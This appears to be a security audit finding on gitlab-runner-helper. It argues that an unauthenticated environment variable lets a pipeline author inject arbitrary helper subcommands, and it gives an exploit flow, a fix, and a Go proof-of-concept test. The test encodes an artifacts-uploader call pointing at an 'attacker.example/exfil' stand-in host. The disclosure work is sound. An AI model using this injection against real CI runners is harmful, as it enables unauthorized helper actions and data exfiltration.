### Title
User-controlled CI/CD variable collision with `_GITLAB_RUNNER_HELPER_NATIVE_STEPS_ARGV` allows unsigned argv injection into `gitlab-runner-helper` - (File: commands/steps/recovery.go)

### Summary
`RecoverArgv` reconstructs `os.Args` from the environment variable `RecoveryEnvVar` (`_GITLAB_RUNNER_HELPER_NATIVE_STEPS_ARGV`) whenever the helper binary is invoked with no positional args, decoding base64/JSON without any authentication of the value's origin. Because job-defined CI/CD variables are injected into the same build container's environment that this recovery mechanism reads from, and the payload is neither signed nor bound to a runner-generated secret, a pipeline author who defines a CI/CD variable with this exact name — combined with an image whose entrypoint invokes the helper binary with zero arguments — can fully control the resulting `os.Args` passed into `app.Run` in `apps/gitlab-runner-helper/main.go`.

### Finding Description
`RecoverArgv` (`commands/steps/recovery.go:28-49`) is called unconditionally in `apps/gitlab-runner-helper/main.go:33` before any CLI parsing. Its logic: [1](#0-0) 
It trusts the environment variable's content completely: base64-decode → JSON-unmarshal → append to `os.Args` → `app.Run(os.Args)`. There is no signature, nonce, or any binding proving the value was set by the trusted executor rather than by job-controlled input. The doc comment itself states the variable is "Set by the executor on the build container" [2](#0-1) , i.e. it lives in the same container/environment namespace as the job's own CI/CD variables, which the docker executor injects into the build container's environment for entrypoint-script compatibility. Since GitLab CI allows an unprivileged pipeline author to define arbitrary-named variables via `variables:` in `.gitlab-ci.yml` (or pipeline/trigger variables), a variable named exactly `_GITLAB_RUNNER_HELPER_NATIVE_STEPS_ARGV` set by the job collides with the runner-internal control channel with no reserved-name protection visible in the reviewed code path.

Exploit flow:
1. Attacker sets a job/pipeline variable `_GITLAB_RUNNER_HELPER_NATIVE_STEPS_ARGV` to `base64(json.Marshal([...attacker subcommand+flags...]))`, using the exported `EncodeRecoveryArgv` format (trivially reproducible since it is public/documented in source).
2. Attacker's image entrypoint/CMD invokes the `gitlab-runner-helper` binary (mounted by the runner) with zero arguments — legitimately reachable because this is exactly the "broken entrypoint" fingerprint the mechanism is designed to recover from, and the attacker fully controls their job's image/entrypoint/CMD.
3. `RecoverArgv` sees `len(os.Args) == 1`, reads the attacker's variable, decodes it, and appends attacker-chosen argv (e.g., `steps serve <attacker-controlled args>` or a `helpers.*` subcommand) to `os.Args`.
4. `app.Run(os.Args)` in `apps/gitlab-runner-helper/main.go:53` dispatches to whatever subcommand the attacker specified, executing with the privileges/mounts available to the helper (which may include cache/artifact credentials, job API tokens, or other mounts not exposed to the build container directly).

Existing checks are insufficient: there is no verification that the env var's value originated from the executor rather than the job; no per-job secret/HMAC is used; the fingerprint condition (`len(os.Args)==1`) is trivially satisfiable by the attacker's own entrypoint/CMD choice since the image and its entrypoint are attacker-controlled input in this threat model.

### Impact Explanation
An unprivileged pipeline author can inject arbitrary subcommands/flags into the `gitlab-runner-helper` binary's CLI dispatch, running with helper-level privileges (e.g., invoking `helpers.NewProxyExecCommand`, `helpers.NewArtifactsUploaderCommand`, `steps.NewCommand`, etc. with attacker-chosen arguments) instead of the executor-intended invocation. This breaks the invariant that helper argv originates only from the trusted executor, enabling unauthorized helper actions inside the job's execution environment.

### Likelihood Explanation
Feasible and repeatable: the attacker fully controls (a) their job's CI/CD variables (variable name and base64/JSON payload, using the same public encoding function) and (b) their job's container image entrypoint/CMD, which is exactly what's needed to satisfy both the `len(os.Args)==1` condition and the presence of the colliding environment variable. No special runner misconfiguration or admin privilege is required beyond standard Docker executor usage with user-supplied images.

### Recommendation
Do not source trusted executor-to-helper argv recovery from a plain, unauthenticated environment variable that shares a namespace with user-controllable CI/CD variables. Bind the recovery payload to a per-job secret unknown to the job (e.g., HMAC-signed with a runner/job-session key, or passed via a channel not reachable by job-defined `variables:`, such as a file only the runner writes with restricted permissions before container start). Additionally, explicitly reject/strip job-defined CI/CD variables that collide with runner-reserved variable name prefixes before container creation.

### Proof of Concept
Extend `commands/steps/recovery_test.go` with a test simulating attacker-set env var content and assert that `os.Args` becomes fully attacker-controlled with no way for the code to distinguish it from a legitimate executor-set value:
```go
func TestRecoverArgv_AttackerControlled(t *testing.T) {
    savedArgs := os.Args
    t.Cleanup(func() { os.Args = savedArgs })
    os.Args = []string{"helper"} // entrypoint invoked helper w/ no args

    maliciousPayload, _ := steps.EncodeRecoveryArgv([]string{
        "artifacts-uploader", "--url", "http://attacker.example/exfil",
    })
    t.Setenv(steps.RecoveryEnvVar, maliciousPayload) // simulates job-defined CI variable

    steps.RecoverArgv()

    assert.Equal(t, []string{"helper", "artifacts-uploader", "--url", "http://attacker.example/exfil"}, os.Args)
    // No assertion path exists in code to reject this: proves no authentication of env var origin.
}
```
This demonstrates that any process capable of setting the env var (including one originating from job-defined CI/CD variables merged into the container environment) can fully determine the helper's subsequent CLI dispatch.

### Citations

**File:** commands/steps/recovery.go (L10-13)
```go
// RecoveryEnvVar carries argv (base64-encoded JSON) for the helper to
// reconstruct when an image entrypoint drops CMD. Set by the executor on
// the build container; read and unset by RecoverArgv.
const RecoveryEnvVar = "_GITLAB_RUNNER_HELPER_NATIVE_STEPS_ARGV"
```

**File:** commands/steps/recovery.go (L28-48)
```go
func RecoverArgv() {
	if len(os.Args) > 1 {
		return
	}
	encoded := os.Getenv(RecoveryEnvVar)
	if encoded == "" {
		return
	}
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return
	}
	var argv []string
	if err := json.Unmarshal(raw, &argv); err != nil {
		return
	}
	if len(argv) == 0 {
		return
	}
	os.Args = append(os.Args, argv...)
	_ = os.Unsetenv(RecoveryEnvVar)
```
